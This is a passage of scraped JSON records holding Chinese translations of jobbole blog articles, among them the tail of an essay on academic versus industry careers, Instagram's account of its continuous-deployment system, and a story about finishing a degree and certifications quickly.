他们可能也会像我一样为发表文章的截止日期而发疯，但在工作和家庭生活之间通常会有更清晰的界限。</p>\n<p>那么为什么我（和其他像我一样的学者）不投身工业界呢？我把它归结为生活的优先级和最终让我们振奋的东西。我曾经在别的地方写过为什么我选择学院的生活。简短来说，就是我不能忍受上头有个老板，即使他像 Amin 和 Eric 一样酷而且有趣。在作为老师的 12 年中，我能够去做我想做的研究，我不能想象除此以外的任何其他生活方式。我曾在最顶尖的大学研究过各种领域的问题，发表过论文，包括网络、无线网络、分布式系统、数据库、安全、人机交互，甚至发明了一两种理论。在其他任何地方，做任何事情，都不能在我真正想做的事情和想共事的人上达到这种程度的自由。</p>\n<p>然后是学生。在 N 年后，看到一个学生在世界上出了名是非常高兴的，而且是你影响了他的生活和职业生涯。一个博导教授的影响是巨大而直接的。当我的学生走向职场时，我能立刻知道我的工作成果的一手信息。我很幸运地看到不少之前的学生在学术界，研究实验室和工业界找到了理想中的工作。这以及能自由地选择我的项目是我每天早晨起床的动力。而这些是不能在研究实验室和工业界获得的。</p>\n<p>它可能也是生活中的一个优先级功能。在我生命中的某些时刻，钱的因素可能也会拥有更高的优先级。这会驱使我做一些不同的事情，尽管我怀疑我只是会成立一个创业公司而不是完全离开学术界投身工业界。这样我有可能产生的直接影响力能与我工业界的同事相当，但是在过程和选择与谁共事上我拥有更多的控制权。</p></blockquote>\n<h3>总结</h3>\n<p>① 没有上司给你指派任务，很自由；② 教书育人，正面影响学生的人生，很有成就感；③ 当前人生阶段的优先级，不是赚钱。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110958\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110958votetotal\">7</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110958\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q69039280\">牧师</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q69039280\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/054C606B0E1407989F7D4399154CDD9A/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Android ROM，APP        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q69039280\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q69039280/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q69039280/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 20</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/0320c1acf91edcafcab3cfa218486cfa.jpg"], "fav_nums": 3, "comment_nums": 5, "create_date": "2017/04/22", "praise_nums": 7}
{"tags": " 2 评论 ,持续部署,IT技术", "front_image_path": "full/2ffcb1686fa54e7247be44e94ed6ab94f63720fe.jpg", "title": "用户 4 亿多，Instagram是如何做持续部署的？", "url_object_id": "79ffd80fc85a4c552992410b56257bf8", "url": "http://blog.jobbole.com/110939/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://engineering.instagram.com/posts/1125308487520335/continuous-deployment-at-instagram/\">Instagram</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：2016 年 6 月的时候，Facebook 旗下图片社交软件 Instagram 注册用户达到 5 亿人，日活 3 亿。2016 年 12 月中旬，Instagram 对外宣传注册用户数量达到 6 亿。本文是 Instagram 工程博客在 2016 年 4 月发布，伯乐在线编译如下。</p>\n<p>在 Instagram，我们每天部署后端代码大约是 30~50 次。无论什么时候，只要工程师提交了修改到服务器，都会进行一次部署，而大多数情况下，这都无人参与。这听起来很疯狂，尤其是在像我们这种规模的情况之下，但这的确没有什么问题。本文将讨论我们是如何实现这个系统的，以及如何保证它稳定流畅地工作。</p>\n<h2>为什么要持续部署？</h2>\n<p>持续部署对我们有诸多好处：</p>\n<p><strong>能够提高工程师们的工作效率。</strong>工程师们无须被限制于每天在固定时间进行几次部署；相反，他们随时都可进行代码部署。这意味着他们可以节约时间并快速地对代码进行迭代更改。</p>\n<p><strong>工程师们识别错误的提交变得容易得多。</strong>持续部署使得工程师们在查找引起新错误的原因的范围缩小了，由之前需要在几十或数百个提交中进行排查缩小到只需在一个或最多两、三个提交中查找。当你稍后发现问题并返回调试时，这也非常有用。运用指示问题的指标或数据，我们可以精确地确认问题的开始时间，继而查找出那个时间点进行的部署都有哪些代码提交。</p>\n<p><strong>让错误提交被快速发现和处理。</strong>这意味着我们在服务器上不会出现无法部署的糟糕情况，而对其它无关的变更造成重大延迟。我们总是处于一个能够快速地从重大困境中恢复的状态。</p>\n<h2>实现</h2>\n<p>这种系统能够得以实现成功，很大程度上归功于它采用迭代方法进行构建。我们没有独立地构建系统，然后突然切换；相反，我们逐步更新当前机制，直到它们成为了持续部署。</p>\n<h3>持续部署之前</h3>\n<p>在持续部署实现之前，工程师们需要对变更进行特地部署。他们完成代码变更后，如果希望它们被尽快部署，他们将运行一次部署。否则，他们会等待另一位工程师来这样做。工程师们被认为是能够知道如何事先进行小规模测试的: 他们先在一台机器上运行部署，登录该机器并检查日志，然后针对整个机队进行部署。这些都使用 Fabric 脚本实现，我们有一个非常基础的数据库和用户界面软件“ Sauron ”来存储部署日志。</p>\n<h3>Canary 和测试</h3>\n<p>第一步是添加 canarying，这在最初只是用来简单地编写工程师们已经预期的工作。脚本用来部署到 canary 机而不是在一台机器上运行一个独立的部署，跟踪用户日志，并询问是否继续全面部署。接下来是对 canary 机的一些基本分析: 一个脚本收集每个请求的 HTTP 状态码，对它们进行分类，并应用硬编码率阈值(例如，小于0.5% 5xx，至少90% 2xx)。但是，如果阈值失败，则只会向用户发出警告。</p>\n<p>我们有一个测试组件，但它只运行在工程师的开发机器上。如果开发人员说测试通过，代码评审人员也只能采信，并且我们也无法知道提交到服务器上的代码的测试结果。因此，我们安装 Jenkins 对服务器上的新的代码提交运行测试，并报告结果给 Sauron。Sauron 将跟踪通过了测试的最新提交，并将此提交作为部署建议，而不是最后一次的提交。</p>\n<p>Facebook 使用 Phabricator（<a href=\"http://phabricator.org/\">http://phabricator.org/</a> ）进行代码评审，并拥有一个与 Phabricator 集成很好的持续集成系统 Sandcastle 。一旦创建或更新存在差异，我们使用 Sandcastle 运行测试，并提供报告。</p>\n<h3>自动化</h3>\n<p>为了实现自动化，首先得做一些基础工作。我们给部署添加了状态（运行、完成、错误），一旦之前的部署不处于“完成”状态，就让脚本发出警告。我们在界面上添加了一个停止按钮，可以将状态变更为“停止”，同时，也让脚本不定期地检查状态并作出相应的反应。我们还对提交增加了完整跟踪； Sauron 之前只知道最后通过了测试的提交，但现在每一次在服务器上的提交都会有记录，而且知道每次提交的具体测试状态。</p>\n<p>然后，我们对其余的仍需要人参与决策的部分也实施了自动化。首先，需要确认哪些提交可以部署。最初的算法总是选择已通过测试的提交，并且越少越好——不会超过三个。如果每个提交都通过了测试，那么每次都会选择一个新的提交，并且最多只可能有两个未通过测试的连续提交。其次，如何确认部署是否成功。如果有超过 1% 的主机部署失败，这次上线会被确认为失败。</p>\n<p>到这个时候，当事情正常的时候，进行代码部署变成了只是简单地回答几次“是”（接受建议的提交，启动 canary ，继续全面部署)。因此，我们允许自动回答这些问题，然后让 Jenkins 运行部署脚本。起初，工程师们启用 Jenkins 实施部署还需要部门监督，到最后，已完全实现了无人监管。</p>\n<h2>问题</h2>\n<p>虽然我们在这个阶段进行了持续部署，但还没有完全顺利。这里仍有几个问题需要解决。</p>\n<h3>测试失败</h3>\n<p>工程师们通常会写出破坏测试的代码，这将导致服务器上所有后续的提交都会测试失败，从而导致任何代码都无法部署。这时候，响应人员需要做的是，恢复错误提交，等待测试通过，然后在自动化可以继续之前手动部署所有积压的代码提交。这破坏了持续部署的主要优点之一，即每次部署少量提交。这里的问题在于测试执行得很慢而且不可靠。我们进行了各种优化，使得测试在5分钟内执行完毕而不再需要12 – 15分钟，并且修复了导致测试不可靠的基础架构问题。</p>\n<h3>积压任务</h3>\n<p>尽管有这些改进，我们仍经常会有一些需要部署的变更积压。最常见的原因是 canary 执行失败（包括真的失败和误报），但偶尔也会有其它的原因。当这些问题解决时，自动化将一次部署一个提交，因此需要一段时间才能清除积压，这将导致新的变更提交部署严重延期。响应人员通常会立即介入，并一次性部署所有的积压的提交，这将破坏持续部署的主要优点之一。</p>\n<p>为了改善这一点，我们在提交选择逻辑中实现了积压处理，这使得自动化在有任务积压时部署多个提交。算法基于设定好每次部署的目标时间（30分钟）。对于队列中的每个提交，它计算出满足目标的剩余时间，在该时间内可以完成的部署次数（使用硬编码值），以及每次部署时需要的代码提交数。它使用每次部署时的最大提交数，但设定上限为 3。这样可以让我们在合理的时间内对每次的提交进行尽可能多的部署。</p>\n<p>造成任务积压的另一个特殊原因是随着我们的基础设施规模的增加，部署进程变得缓慢。我们发现 SSH 代理与整个 SSH 连接授权的内核挂钩，同时 Fab 主进程也与一个管理所有任务的内核挂钩。该问题的解决方案是切换到 Facebook 的分布式 SSH 系统。</p>\n<h2>指导原则</h2>\n<p>那么，为了实现类似于我们所做的系统，你需要些什么呢? 我们系统运行良好，有一些关键原则在起作用，你可以借鉴。</p>\n<ol>\n<li>测试：测试组件需要能够被快速执行。它需要有适当的覆盖率，但无需十全十美。测试需要经常执行：在代码审查期间，在代码提交前（理想情况下阻止测试失败的代码进行提交），以及提交后。</li>\n<li>Canary : 需要一个自动化的 canary 脚本，以防止真正的错误提交被部署到整个机队中。然而，它不需要是完美的–即使是非常简单的统计数据和阈值，也是非常不错的。</li>\n<li>自动化正常场景： 不必对所有的场景都实现自动化；仅仅需要对已知的，正常的情况进行自动化。如果有任何的异常，停止自动化，人工处理。</li>\n<li>让人感觉舒服：我认为这种自动化系统的一大障碍是让人感到不连贯和失控。为了解决这个问题，自动化系统需要提供可视化界面，显示它所做的，正在做的，以及（最好）即将做的。它还需要提供良好的停止机制。</li>\n<li>预计糟糕的部署：会出现有问题的变更，但这没关系。你只需要快速检测出问题，并且能够快速回滚。</li>\n</ol>\n<p>这是一些其它公司也同样可以实施的原则。持续部署系统并不需要太过复杂。关注以上原则，从一些简单的东西开始，并不断地进行改进。</p>\n<h3>下一步工作</h3>\n<p>目前，这个系统工作得很好， 但我们仍面临着更进一步的挑战，同时，我们也希望做更深入的优化。</p>\n<ul>\n<li>保持快速部署： Instagram 正在迅速增长，因此提交率将会持续升高。我们需要保持快速部署，以便在每次部署时保持很少的提交。有一种可能的解决方案，将上线划分为多个阶段，并实施流水线。</li>\n<li>增加 Canarying 脚本: 代码提交率的攀升,  canary 的执行失败和任务的积压，影响着越来越多的开发人员。为了防止更多错误提交进入服务器并阻塞部署，我们将 canarying 集成到 Landcastle 。测试通过后， Landcastle 将测试生产流量的变化，如果没有通过 canary 阈值，将失败。</li>\n<li>比较更多数据: 我们希望改善 Canary 的检测能力, 所以我们计划收集和检查更多的统计信息，如每个视图功能的响应状态码。我们还尝试从一组控制机器上收集统计信息，并将其与 Canary 中的数据统计信息进行比较，而不是当前的静态阈值。</li>\n<li>改善检测能力：减少因未被 canary 捕获的错误提交带来的影响，也是不错的。我们可以在（集群或区域）之间添加更多的阶段。在进入下一阶段之前检查该阶段的指标，而不是仅在一台机器上测试然后就部署到整个生产环境。</li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110939\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110939votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110939\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/Instagram-for-Android-.jpg"], "fav_nums": 4, "comment_nums": 2, "create_date": "2017/04/20", "praise_nums": 2}
{"tags": " 5 评论 ,职场", "front_image_path": "full/0c7c6eb4253bd11a059781674b421100064233fb.jpg", "title": "边工作边带娃，我是如何在 1 年内拿到第 2 个学位和 5 个开发者认证的", "url_object_id": "d8d1203fef5a9aa35265080aa3981c9f", "url": "http://blog.jobbole.com/110986/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/guluyi\">古鲁伊</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.com/how-i-got-a-second-degree-and-earned-5-developer-certifications-in-just-one-year-while-working-and-2b902ee291ab\">Beau Carnes</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>常规的做事方法都是为傻瓜准备的，因为它设计的目的就是让每个人都能够跟上进度。实际上大多数人都可以做的更快更好。<b></b></p>\n<h3>我是如何边工作边带娃还在一年内拿到第二个学位和五个开发者认证的</h3>\n<div style=\"width: 2010px\" class=\"wp-caption alignnone\"><img src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fey2b7vf95j21jk10j151.jpg\" alt=\"\" width=\"2000\" height=\"1315\">\n<p class=\"wp-caption-text\">边带娃边做些工作</p>\n</div>\n<blockquote><p>“常规的做事方法都是为傻瓜准备的，因为它设计的目的就是让每个人都能够跟上进度。实际上大多数人都可以做的更快更好。这不仅仅只适用于学校，所有事都是这样。”—— CD Baby 创始人 Derek Sivers</p></blockquote>\n<p>学习编程是一件很有挑战性的事情，尤其是在同时兼顾工作和带娃的情况下。尽管如此，我还是认为自己应该不走寻常路。</p>\n<p>虽然我确实对这些成绩很骄傲，但是我写此文的目的不是为了自夸，而是为了向你证明常规做法也同样不适合<strong>你</strong>。</p>\n<p>过去一年我完成了很多事情：我考取了两个 Oracle Java 认证、两个 CompTia 认证以及 freeCodeCamp 的前端认证。以上每一个认证，大多数人都要花几个月的时间进行准备，但是我每个只用了三个星期。</p>\n<p>此外，我还在  6 个月内完成了知名大学软件开发专业的所有课程，拿到了第二个学士学位。。</p>\n<p>以上成绩都是在我全职工作，并且照例陪伴妻儿、参与社区志愿活动的情况下取得的。</p>\n<p>完成这些的的一个关键是有个全力支持你的伴侣。</p>\n<p>可是除此之外也有一些可以帮助你的方法。</p>\n<h3>我的动力是什么？</h3>\n<p>当了 5 年的 K-12 老师后，我意识到我并不想余生都在学校里教书。</p>\n<p>我热爱教育的言传身教，但是厌烦强迫孩子做他们不喜欢做的事这种教育模式。城市学校的教室管理让我倍感压力。我对整个教育体系也不再抱有幻想。我们似乎正在教孩子们为 那些将不再存在的职业 做准备。</p>\n<p>我一直对编程很感兴趣，有时甚至会用 Scratch 和 Code.org 教学生一些基础的编码知识。我觉得是时候进一步学习、全职编程了。</p>\n<p>换新工作的欲望是很好的动力。继续做老师的每一天都鞭策着我向目标前行。</p>\n<h3>调研、调研再调研</h3>\n<p>不要急着一头扎进学习中。并不是所有的学校或学习资源都是平等的，错误的决定会让你的目标和能力不匹配。</p>\n<p>我试着找出怎样的学习方法对我和我的家庭最有效。我知道有很多方式进入科技产业，但是最终决定采用稍显老套的途径：学位。我已经学过一些课程，可以制定新的计划。我看了很多可选的学校，最后选择了 Western Governors University，原因如下：</p>\n<p>1.课程全部在线，这样我就不用为交通花费时间。</p>\n<p>2.你可以按自己的进度来，这样我就可以很快结束课程。只要你完成一门课程所有的作业和考试，就可以直接开始下一门课程。</p>\n<p>3.成本低——每半年约 $3000。</p>\n<p>4.行业认可、信誉良好，并且 <a href=\"http://www.wgu.edu/about_WGU/what_others_say\">Obama 总统和 Bill Gates</a> 曾推荐过。</p>\n<p>5.学位包含行业认证，可为学历增加可信度。</p>\n<h3>挑战目标</h3>\n<p>最开始，我的目标是在一年内取得学位。计划执行一个月后，我决定调整目标，在半年内完成。</p>\n<p>从这点说，能够快速完成目标是因为：我为每门课都设置了完成的具体日期，所以我能够在半年内完成所有课程。</p>\n<p>我给每门课计划了 1~3 周时间，具体时间视课程需要而定。当时我还制定了如何快速完成每门课程的计划。在学习过程中制定子目标对我帮助很大，这样我就能保证按计划进行。</p>\n<div style=\"width: 778px\" class=\"wp-caption alignnone\"><img src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fey2b8n0pbj20lc0cqgnm.jpg\" alt=\" 我为课程制定的部分电子表格\" width=\"768\" height=\"458\">\n<p class=\"wp-caption-text\">我为课程制定的部分电子表格</p>\n</div>\n<p>有挑战性的目标很重要。它们为我增加了推进自己的动力。消费者调查杂志的一项 <a href=\"http://www.inc.com/news/articles/201108/study-says-ambitious-goals-make-people-happier.html\">研究</a> 表明有挑战性的目标可以使人更快乐。最终我全部达到或超额完成了自己设定的截止日期，这也的确让我很高兴。</p>\n<h3>具体日程安排</h3>\n<p>我建了一份详细的周计划，以免花费太多时间学习，忽视了家庭和其它责任。我安排了家庭时间、志愿时间、朋友时间，甚至每周的夜晚约会。</p>\n<div style=\"width: 810px\" class=\"wp-caption alignnone\"><img src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fey2b982x2j20m80c0wjj.jpg\" alt=\"\" width=\"800\" height=\"432\">\n<p class=\"wp-caption-text\">学位课程初期制定的日程。现在我有更详细的日程。</p>\n</div>\n<p>详尽的日程可以确保我生活的平衡。但是有一项我没有加进日程中：<strong>电视</strong>。</p>\n<p>在考取学位期间，我只看过 3 集电视。我的日程很紧，所以我能完成目标，同时也就没有时间看电视了。此外，在看电视上花费时间就意味着要减少陪伴家人的时间。结业后，我仍控制看电视的时间，这样我就可以集中注意力编码。</p>\n<p>为了实现目标，需要放弃一些东西。</p>\n<h3>忽略嫉恨你的人！</h3>\n<p>Western Governors 大学会给每位学生分配导师。学生们每周和导师联系，以规束自己。每当我和导师分享我的目标时，她都会劝我目标设置得更合理些。</p>\n<p>相反，我决定设置更高的目标。我知道她是出于好意，但是我决定忽略她的警告，并且不再和她分享我的目标。</p>\n<p>我发现有的时候，如果某些人不会鼓励你，那么不再和他们分享你的目标会更有帮助。</p>\n<h3>最大化时间</h3>\n<p>除了安排时间学习软件开发，我还有办法学习更多内容。例如，我利用午休时间学习，我还会随身带着笔记，这样就可以在空闲时进行复习。</p>\n<p>我还做了另一件事（现在仍在继续）——利用教师工作的业余时间学习课程或编写项目。取得学位后，我将业余时间排在日程中，因为我知道有更难的课程要通过。</p>\n<p>我尝试不断重新评估日程，以及我是怎样利用时间的，这样我就可以提升效率。</p>\n<p>过去我在孩子睡着后敲代码。但是我注意到夜晚我的大脑不太好用。我调整了睡眠时间，所以我现在 9 点睡觉 4 点起床敲代码（制作 <a href=\"https://www.youtube.com/playlist?list=PLWKjhJtqVAbmoiNlqLJg1gxEjEuKHHcn_\">培训视频</a>）。这可能听起来有点疯狂，但是极大地提升我的生产率。</p>\n<h3>学习其他人做的事</h3>\n<p>为了大学和各种论坛，我在 Reddit 上花费很多时间，总结别人是如何完成课程的。行业认证有更多有用的资源。这使我可以更好地规划最快的完成方法。</p>\n<p>总会有人走过你正在走的路，找出这些人、向他们学习很重要。</p>\n<p>向别人学习用于 freeCodeCamp 课程也同样有效。社区中有经验的人通常都会愿意在论坛或社区聊天室中提供帮助或建议。</p>\n<h3>输出吧！</h3>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fey2ba3go3j20b40b4mzs.jpg\"></p>\n<p><strong>输出 </strong>是说输出完成的成果。</p>\n<p>很多时候我在想，是否需要在项目或学习上花更多的时间。之后我意识到如果想达到自己定的截止日期，我就没有时间。</p>\n<p>截止日期迫使我在完全准备好之前行动，这确实有效。</p>\n<p>我发现输出项目比把项目做完美更重要。如果想要确保所有事都就绪，可能永远都无法完成。当犹豫时，输出吧！</p>\n<h3>二八原则</h3>\n<p><img src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fey2baxwvqj20l407y74p.jpg\"></p>\n<p>二八原则说的是：多数事件，大约 20% 会达成 80% 的效果。当学习软件开发时，这意味着 20% 的学习内容会包含大约 80% 实际用到的东西。如果只专注于这 20%，那么可以节省很多时间。</p>\n<p>就学位课程来说，我只读了 20–30% 的必修内容。根据二八原则，这足够理解超过 80% 的主题。</p>\n<p>这个诀窍的关键是哪 20% 需要拿下。我通常会问自己：“如果我设计考试，我会包含这部分内容吗？”</p>\n<p>讲真，学习任何东西时，都应该问自己这是不是会带给你 80% 价值的那 20% 的内容。</p>\n<p>这和及时消息的想法相关。通常学习近期不会用到的东西没什么好处，特别是当你的记忆力和我一样糟糕时。在项目中，我只去学习项目中会用得到的东西。</p>\n<p>雇主通常更关心你创造的项目，而不是你如何学习编码。记住这个事实会帮助你最好地利用时间。</p>\n<h3>保持前进</h3>\n<p>自从取得学位后，我从未停止过学习。我意识到了项目的重要性，所以我径直考取了 freeCodeCamp，并且开始创建个人项目以建立我的作品集。我可以继续使用我获取学位时的所有策略。</p>\n<p>当决定开始创建 JavaScript 培训视频时，我也沿用了这些策略。现在我几乎每天都在 freeCodeCamp YouTube 频道 上传 JavaScript 培训视频。</p>\n<p>如果你对我快速完成 WGU 学位每门课程的具体事宜感兴趣，可以查看 <a href=\"http://carnes.cc/2016/06/how-i-completed-my-entire-wgu-software-development-degree-in-6-months-76-cus/\">这篇博客</a>。</p>\n<p>我希望我用过的策略也同样可以帮助到你，即使你的生活和我一样忙碌。记住：常规的做事方法是为傻瓜准备的，你可以做的更好！</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/8b23458dab045a48228dfa537d5241ea.png\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/d2beee507374a3f33067e97fc125e755.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110986\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110986votetotal\">7</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110986\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 12 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/guluyi\">古鲁伊</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/guluyi\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/662ce8e129bd8134e24a22b10abb0385.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            立志做一名有格调的程序媛        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/guluyi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/guluyi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/guluyi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 33</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fey2b7vf95j21jk10j151.jpg"], "fav_nums": 12, "comment_nums": 5, "create_date": "2017/04/24", "praise_nums": 7}
{"tags": "深度学习,机器学习,IT技术", "front_image_path": "full/eadb28355fab57e9672e5c965147ef4caca04ac4.jpg", "title": "机器学习流行趋势一览", "url_object_id": "a7c10e6b7a009be802a1c6cfd9fb53d0", "url": "http://blog.jobbole.com/110976/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/@karpathy/a-peek-at-trends-in-machine-learning-ab8a1085a106\">Andrej Karpathy</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>你用过 Google Trends 